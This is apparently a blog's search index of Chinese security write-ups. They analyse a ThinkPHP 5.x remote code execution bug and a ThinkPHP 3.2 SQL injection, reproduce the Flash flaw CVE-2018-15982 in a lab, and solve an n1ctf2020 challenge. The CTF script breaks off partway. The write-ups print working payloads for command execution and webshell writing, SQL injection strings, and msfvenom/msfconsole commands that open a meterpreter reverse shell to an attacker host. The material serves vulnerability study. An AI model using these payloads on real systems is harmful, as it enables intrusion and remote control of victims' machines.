<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>tp5.0-RCE</title>
      <link href="/2020/10/28/tp5-0-RCE/"/>
      <url>/2020/10/28/tp5-0-RCE/</url>
      
        <content type="html"><![CDATA[<h2 id="tp5-0-amp-5-1远程RCE"><a href="#tp5-0-amp-5-1远程RCE" class="headerlink" title="tp5.0&amp;5.1远程RCE"></a>tp5.0&amp;5.1远程RCE<a id="more"></a></h2><h3 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Thinkphp v5<span class="number">.1</span><span class="number">.29</span></span><br><span class="line">php7<span class="number">.0</span><span class="number">.12</span>+Apache2</span><br></pre></td></tr></table></figure><h3 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h3><p>2018年12月9日，<code>ThinkPHP</code>团队发布了一个补丁更新，修复了一处由于路由解析缺陷导致的代码执行漏洞。该漏洞危害程度非常高，默认环境配置即可导致远程代码执行。</p><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><ul><li><code>ThinkPHP 5.0.5-5.0.22</code></li><li><code>ThinkPHP 5.1.0-5.1.30</code></li></ul><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>根据漏洞介绍，该漏洞是由于路由解析导致的，先来看一下取路由的文件</p><p><code>thinkphp/library/think/Request.php</code></p><img src="/2020/10/28/tp5-0-RCE/1.png" class=""><p>这里传入的参数<code>var_pathinfo</code>,可以去配置文件中看看</p><img src="/2020/10/28/tp5-0-RCE/2.png" class=""><p><code>pathinfo</code>的值将会是以GET方式传给形参s的，追踪<code>pathinfo()</code>调用情况</p><p>在同一个文件下的<code>path()</code>方法中进行了调用</p><img src="/2020/10/28/tp5-0-RCE/3.png" class=""><p><code>path()</code>函数对传进来的<code>pathinfo</code>参数值进行了过滤，最后赋给了<code>$this-&gt;path</code>并且返回该值</p><p>追踪调用<code>path()</code>函数的地方，来到了<code>thinkphp/library/think/App.php</code></p><img src="/2020/10/28/tp5-0-RCE/4.png" class=""><p>这里进行了路由检测，返回一个Dispatch对象，跟一下check函数</p><img src="/2020/10/28/tp5-0-RCE/5.png" class=""><p>这里的Check函数最后返回的是一个实例化的<code>UrlDispatch</code>对象，传递了<code>$url</code>，跟一下<code>UrlDispatch</code>类</p><img src="/2020/10/28/tp5-0-RCE/6.png" class=""><p>传入的<code>$dispatch</code>被赋值给了<code>$this-&gt;dispatch</code>，跟一下<code>$this-&gt;dispatch</code>的最后处理，跟到了<code>init()</code>方法</p><img src="/2020/10/28/tp5-0-RCE/7.png" class=""><p><code>$this-&gt;dispatch</code>经过了<code>parseUrl</code>方法的检测，跟进，发现又传给了<code>parseUrlPath</code>,继续跟进</p><img src="/2020/10/28/tp5-0-RCE/8.png" class=""><p>利用<code>/</code>对<code>$url</code>变量进行分割，且<code>$url</code>的格式为‘模块/控制器/操作’，将<code>$url</code>分割后的值存放在<code>$path</code>变量当中，并返回到<code>parseUrl()</code>函数，最终返回到<code>Url</code>类中<code>init()</code>函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> (<span class="keyword">new</span> Module(<span class="keyword">$this</span>-&gt;request, <span class="keyword">$this</span>-&gt;rule, $result))-&gt;init();</span><br></pre></td></tr></table></figure><p>路由信息数组传递到$result变量中，之后传递给了<code>Module</code>,<code>Module</code>的父类也是<code>Dispatch</code>，<code>$result</code>值传递给了变量<code>$this-&gt;dispatch</code>，随后调用<code>Module</code>类的<code>init()</code>函数对<code>$this-&gt;dispatch</code>进行处理</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ($module &amp;&amp; $available) &#123;</span><br><span class="line">                <span class="comment">// 初始化模块</span></span><br><span class="line">                <span class="keyword">$this</span>-&gt;request-&gt;setModule($module);</span><br><span class="line">                <span class="keyword">$this</span>-&gt;app-&gt;init($module);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> HttpException(<span class="number">404</span>, <span class="string">'module not exists:'</span> . $module);</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><p>模块初始化需要让<code>$available</code>为true，也就是<code>is_dir($this-&gt;app-&gt;getAppPath(). $module)</code>要成立，默认模块是即入口函数为<code>index</code>,<code>$this-&gt;dispatch</code>的值最终传递到<code>$this-&gt;controller</code>中，<code>init()</code>函数处理完过后，进入exec()函数,跟进</p><img src="/2020/10/28/tp5-0-RCE/9.png" class=""><p><code>$this-&gt;controller()</code>被传递给了<code>controller()</code>函数，跟进</p><img src="/2020/10/28/tp5-0-RCE/10.png" class=""><p><code>$name</code>可控，调用<code>parseModuleAndClass()</code>函数进行处理，继续跟进</p><img src="/2020/10/28/tp5-0-RCE/11.png" class=""><p><code>$name</code>只要有<code>\</code>，就赋给<code>$class</code>,实例化之后返回，在函数中执行完之后返回到<code>controller</code>中</p><img src="/2020/10/28/tp5-0-RCE/12.png" class=""><p>由于存在<code>$class</code>，接下去就会调用<code>__get()</code>魔术方法并返回，跟一下<code>__get()</code>魔术方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($name)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;make($name);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>调用了<code>make</code>方法，跟进</p><p>make()将传入的传入的变量实例化为一个类，即<code>controller()</code>中<code>$name</code>为我们可以控制的值，可以通过构造<code>$name</code>变量来实例化任何一个类，所以我们可以通过构造<code>s=index/\think\class/method</code>来实例化<code>\think\class</code>类并且执行该类的method方法达到控制程序流</p><img src="/2020/10/28/tp5-0-RCE/13.png" class=""><p>在<code>think/Request.php</code>中找到<code>input</code>方法，可以构造payload了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s&#x3D;index&#x2F;think\Request&#x2F;input&amp;filter&#x3D;phpinfo&amp;data&#x3D;1</span><br></pre></td></tr></table></figure><img src="/2020/10/28/tp5-0-RCE/14.png" class=""><p>在<code>\think\template\driver\file</code>类中找到可以任意写文件的方法write</p><img src="/2020/10/28/tp5-0-RCE/15.png" class=""><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s&#x3D;index&#x2F;think\template\driver\file&#x2F;write&amp;cacheFile&#x3D;shell.php&amp;content&#x3D;&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure><p>这样就可以在根目录写入shell了</p><h3 id="5-0版本poc"><a href="#5-0版本poc" class="headerlink" title="5.0版本poc"></a>5.0版本poc</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">命令执行：?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=[系统命令]</span><br><span class="line">文件写入：?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][]=shell.php&amp;vars[1][1]=&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>具体的利用就用上面的<code>poc</code>对应版本就可以打了，下面是5.1写shell文件的示例</p><img src="/2020/10/28/tp5-0-RCE/15.png" class=""><h3 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h3><p>使用更高版本的<code>thinkphp</code>框架</p><h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;paper.seebug.org&#x2F;760&#x2F;</span><br><span class="line">https:&#x2F;&#x2F;www.jianshu.com&#x2F;p&#x2F;46ceb2c338bc?from&#x3D;groupmessage</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> tp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>tp3.2_find_select_delete_sql</title>
      <link href="/2020/10/27/tp3-2-find-select-delete-sql/"/>
      <url>/2020/10/27/tp3-2-find-select-delete-sql/</url>
      
        <content type="html"><![CDATA[<h2 id="tp历史版本漏洞"><a href="#tp历史版本漏洞" class="headerlink" title="tp历史版本漏洞"></a>tp历史版本漏洞<a id="more"></a></h2><h3 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.thinkphp.cn&#x2F;download&#x2F;610.html</span><br><span class="line">下载解压缩放在phpstudy的www目录下</span><br></pre></td></tr></table></figure><p>配置数据库</p><p><code>thinkphp_3.2.3_full\Application\Common\Conf\config.php</code></p><img src="/2020/10/27/tp3-2-find-select-delete-sql/1.png" class=""><p>搭建测试数据库，表结构如图</p><img src="/2020/10/27/tp3-2-find-select-delete-sql/2.png" class=""><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>首先看到添加的方法<code>test()</code></p><img src="/2020/10/27/tp3-2-find-select-delete-sql/6.png" class=""><p>跟进获取id的方法<code>I</code>,这里进行了一次<code>htmlspecialchars</code>和<code>think_filter</code>过滤</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">think_filter</span><span class="params">(&amp;$value)</span></span>&#123;</span><br><span class="line"><span class="comment">// TODO 其他安全过滤</span></span><br><span class="line"><span class="comment">// 过滤查询特殊字符</span></span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">'/^(EXP|NEQ|GT|EGT|LT|ELT|OR|XOR|LIKE|NOTLIKE|NOT BETWEEN|NOTBETWEEN|BETWEEN|NOTIN|NOT IN|IN)$/i'</span>,$value))&#123;</span><br><span class="line">        $value .= <span class="string">' '</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到其实过滤的并不严格</p><p>接着就是跟进<code>find</code>方法</p><img src="/2020/10/27/tp3-2-find-select-delete-sql/7.png" class=""><p>可以看到在<code>find</code>方法中会进入<code>__parseOptions</code>方法，跟进一下</p><img src="/2020/10/27/tp3-2-find-select-delete-sql/8.png" class=""><p>这里可以看到<code>select</code>，后面的正常数据也未进行处理，导致注入</p><p>重点回到<code>__parseOptions</code>方法中的字段类型验证，如果<code>is_array($options[&#39;where&#39;])</code>这个条件满足，那么我们注入的<code>SQL</code>语句都会被<code>_parseType</code> 进行强转，如果是id[where]则导致不满足，产生注入</p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p><code>thinkphp_3.2.3_full\Application\Home\Controller\IndexController.class.php</code>添加一下代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">       $id = i(<span class="string">'id'</span>);</span><br><span class="line">       $res = M(<span class="string">'user'</span>)-&gt;find($id);</span><br><span class="line">       <span class="comment">//$res = M('user')-&gt;delete($id);</span></span><br><span class="line">       <span class="comment">//$res = M('user')-&gt;select($id);</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>对于<code>select()</code>和<code>find()</code>方法，有较多可注入点，可以追踪<code>parseSql</code>来进行查看</p><img src="/2020/10/27/tp3-2-find-select-delete-sql/3.png" class=""><p>下面的exp是<code>table、alias、where</code>的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">table:m=Home&amp;c=Index&amp;a=test&amp;id[table]=user where%<span class="number">201</span>%<span class="number">20</span><span class="keyword">and</span>%<span class="number">20</span>updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,user(),<span class="number">0x7e</span>),<span class="number">1</span>)--</span><br><span class="line">alias:m=Home&amp;c=Index&amp;a=test&amp;id[alias]=where%<span class="number">201</span>%<span class="number">20</span><span class="keyword">and</span>%<span class="number">20</span>updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,user(),<span class="number">0x7e</span>),<span class="number">1</span>)--</span><br><span class="line">where:m=Home&amp;c=Index&amp;a=test&amp;id[where]=<span class="number">1</span>%<span class="number">20</span><span class="keyword">and</span>%<span class="number">20</span>updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,user(),<span class="number">0x7e</span>),<span class="number">1</span>)--</span><br></pre></td></tr></table></figure><img src="/2020/10/27/tp3-2-find-select-delete-sql/4.png" class=""><p>对于<code>delete,</code>,<code>table,alias,where，在使用table和alias的时候，同时还必须保证where不为空</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">where: http:<span class="comment">//127.0.0.1/index.php?m=Home&amp;c=Index&amp;a=test&amp;id[where]=1%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)--</span></span><br><span class="line"></span><br><span class="line">alias: http:<span class="comment">//127.0.0.1/index.php?m=Home&amp;c=Index&amp;a=test&amp;id[where]=1%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)--</span></span><br><span class="line"></span><br><span class="line">table: http:<span class="comment">//127.0.0.1/index.php?m=Home&amp;c=Index&amp;a=test&amp;id[table]=user%20where%201%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)--&amp;id[where]=1</span></span><br></pre></td></tr></table></figure><img src="/2020/10/27/tp3-2-find-select-delete-sql/5.png" class="">]]></content>
      
      
      
        <tags>
            
            <tag> tp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2018-15982</title>
      <link href="/2020/10/23/CVE-2018-15982/"/>
      <url>/2020/10/23/CVE-2018-15982/</url>
      
        <content type="html"><![CDATA[<h2 id="adobe-flasher远程命令执行漏洞"><a href="#adobe-flasher远程命令执行漏洞" class="headerlink" title="adobe flasher远程命令执行漏洞"></a>adobe flasher远程命令执行漏洞<a id="more"></a></h2><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>2018年11月29日，某团队在全球范围内第一时间发现一起针对俄罗斯的APT攻击行动，通过一份俄文内容的医院员工问卷文档，携带最新的Flash <code>0day</code>漏洞和具有自毁功能的专属木马程序，该漏洞允许攻击者恶意制作的Flash对象在受害者的计算机上执行代码，从而获取对系统命令行的访问权限。</p><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p><code>AdobeFlash Player &lt;= 31.0.0.153</code></p><p><code>AdobeFlash Player Installer&lt;= 31.0.0.108</code></p><h2 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">攻击机:Linux kali</span><br><span class="line">靶机:搭载adobeFlash29的windows7 x64</span><br></pre></td></tr></table></figure><h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">获取CVE网上公开的poc</span><br><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;Ridter&#x2F;CVE-2018-15982_EXP</span><br></pre></td></tr></table></figure><p>根据网上公开的payload，创建payload</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp_rc4 RC4PASSWORD=123 LHOST=172.22.236.233 LPORT=4444 -f raw&gt;86.bin</span><br><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp_rc4 RC4PASSWORD=123 LHOST=172.22.236.233 LPORT=4444 -f raw&gt;64.bin</span><br></pre></td></tr></table></figure><p>这会生成对应的两个对应的<code>bin</code>可执行文件，但是在后续发现payload有问题，并且公开文章中反弹shell的截图都比较，emm，所以只有自己测试。经过不断测试，修改了payload，下面的payload是得到shell的,也就是生成<code>meterpreter</code>反弹</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp_rc4 LHOST=172.22.236.233 LPORT=4444 -f raw&gt;86.bin</span><br><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp_rc4 LHOST=172.22.236.233 LPORT=4444 -f raw&gt;64.bin</span><br></pre></td></tr></table></figure><img src="/2020/10/23/CVE-2018-15982/1.png" class=""><p>得到<code>bin</code>文件之后，调用<code>poc</code>脚本生成对应的文件</p><p>在调用之后将生成的文件移到web服务路径下</p><img src="/2020/10/23/CVE-2018-15982/2.png" class=""><p>开启web服务，访问一下本地服务</p><img src="/2020/10/23/CVE-2018-15982/3.png" class=""><p>可以成功访问到刚刚生成的<code>index.html</code>文件，下面开启监听，这里接触到一个之前并不了解的工具，<code>msfconsole</code>控制台</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">拓展：</span><br><span class="line">Msfconsole提供了一个一体化的集中控制台。通过msfconsole，你可以访问和使用所有的metasploit的插件，payload，利用模块，post模块等等。Msfconsole还有第三方程序的接口，比如nmap，sqlmap等，可以直接在msfconsole里面使用。</span><br><span class="line">具体的可以看看这篇文章</span><br><span class="line">https:&#x2F;&#x2F;blog.csdn.net&#x2F;xianjie0318&#x2F;article&#x2F;details&#x2F;81482209https:&#x2F;&#x2F;blog.csdn.net&#x2F;xianjie0318&#x2F;article&#x2F;details&#x2F;81482209</span><br></pre></td></tr></table></figure><p>下面启用<code>msfconsole</code>控制台之后进行payload等设置进行监听，<code>linux</code>终端挨个调用</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp_rc4</span><br><span class="line">set lport 4444</span><br><span class="line">set lhost ip</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><img src="/2020/10/23/CVE-2018-15982/4.png" class=""><p>在靶机中用IE浏览器访问攻击机的<code>ip</code>地址，成功弹回shell</p><img src="/2020/10/23/CVE-2018-15982/5.png" class=""><p>下面可以看一下靶机的相关信息，像是拥有者，桌面文件</p><img src="/2020/10/23/CVE-2018-15982/6.png" class=""><p><code>GITHUB</code>上给的payload弹的是一个本地的计算器，这里直接进行尝试，切换到shell下</p><img src="/2020/10/23/CVE-2018-15982/7.png" class=""><img src="/2020/10/23/CVE-2018-15982/8.png" class=""><p>还可以往其他硬盘中写入文件，在D盘根目录下写入<code>peguin.txt</code>，写点东西进去</p><img src="/2020/10/23/CVE-2018-15982/9.png" class=""><img src="/2020/10/23/CVE-2018-15982/10.png" class=""><h2 id="复现总结"><a href="#复现总结" class="headerlink" title="复现总结"></a>复现总结</h2><p>这次复现过程比较曲折，adobe由于即将下线关于历史版本的下载页面已经下线，找到符合复现环境的adobe版本就花了挺长时间。其次公开的payload文章给的payload不能直接利用，开始没有想到修改payload，还是自己的原因</p><h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><p>Adobe官方已经发布新版本修复了上述漏洞，用户应及时升级进行防护。</p><p>下载更新地址：<a href="https://get.adobe.com/flashplayer" target="_blank" rel="noopener">https://get.adobe.com/flashplayer</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">参考链接</span><br><span class="line">https:&#x2F;&#x2F;www.freebuf.com&#x2F;column&#x2F;197760.html</span><br><span class="line">https:&#x2F;&#x2F;blog.csdn.net&#x2F;xuandao_ahfengren&#x2F;article&#x2F;details&#x2F;86532740</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> CVE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>n1ctf2020</title>
      <link href="/2020/10/20/n1ctf2020/"/>
      <url>/2020/10/20/n1ctf2020/</url>
      
        <content type="html"><![CDATA[<p>这次比赛难度挺大的，也有收获，继续加油<a id="more"></a></p><h2 id="Signin"><a href="#Signin" class="headerlink" title="Signin"></a>Signin</h2><h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><ul><li>盲注</li><li>序列化</li></ul><h3 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ip</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $ip;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">waf</span><span class="params">($info)</span></span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>]))&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;ip = <span class="keyword">$this</span>-&gt;waf($_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>]);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;ip =$_SERVER[<span class="string">"REMOTE_ADDR"</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $con=mysqli_connect(<span class="string">"localhost"</span>,<span class="string">"root"</span>,<span class="string">"********"</span>,<span class="string">"n1ctf_websign"</span>);</span><br><span class="line">        $sqlquery=sprintf(<span class="string">"INSERT into n1ip(`ip`,`time`) VALUES ('%s','%s')"</span>,<span class="keyword">$this</span>-&gt;waf($_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>]),time());</span><br><span class="line">        <span class="keyword">if</span>(!mysqli_query($con,$sqlquery))&#123;</span><br><span class="line">            <span class="keyword">return</span> mysqli_error($con);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"your ip looks ok!"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        mysqli_close($con);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">flag</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $ip;</span><br><span class="line">    <span class="keyword">public</span> $check;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($ip)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;ip = $ip;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getflag</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(md5(<span class="keyword">$this</span>-&gt;check)===md5(<span class="string">"key****************"</span>))&#123;</span><br><span class="line">    readfile(<span class="string">'/flag'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;ip;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(stristr(<span class="keyword">$this</span>-&gt;ip, <span class="string">"n1ctf"</span>)!==<span class="keyword">False</span>)</span><br><span class="line">            <span class="keyword">$this</span>-&gt;ip = <span class="string">"welcome to n1ctf2020"</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;ip = <span class="string">"noip"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;getflag();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'input'</span>]))&#123;</span><br><span class="line">    $input = $_GET[<span class="string">'input'</span>];</span><br><span class="line">unserialize($input);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>拿到代码的时候以为考的是序列化，但是在尝试过程中发现不是</p><p>开始的时候方向错了，按照习惯<code>new</code>了一个<code>flag</code>类，绕过<code>__wakeup()</code>魔术方法，后来和队内师傅交流才发现如果绕过了就拿不到回显，要改一下方向</p><p>这里注意到第一个类里存在<code>mysqli_error($con)</code>,结合拿到flag的条件，应该要注出数据库中的<code>key</code></p><p>这里不能绕过<code>__wakeup()</code>，根据数据中有无<code>n1ctf</code>来进行判断，根据回显的不同作为条件</p><p>上面的<code>sql</code>部分查到了一个题，用的是报错注入，这里也就用报错注入</p><p>这里开始想的是<code>updatexml</code>优先级太高，没有想到把<code>if</code>放到里面，队里师傅提醒，也就有了思路</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://101.32.205.189/index.php?input=O:4:"flag":2:&#123;s:2:"ip";O:2:"ip":1:&#123;s:2:"ip";i:1;&#125;s:5:"check";s:4:"test";&#125;'</span></span><br><span class="line">result = <span class="string">''</span></span><br><span class="line">req = requests.session()</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">50</span>):</span><br><span class="line">    high = <span class="number">127</span></span><br><span class="line">    low = <span class="number">32</span></span><br><span class="line">    mid = (low + high) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> high &gt; 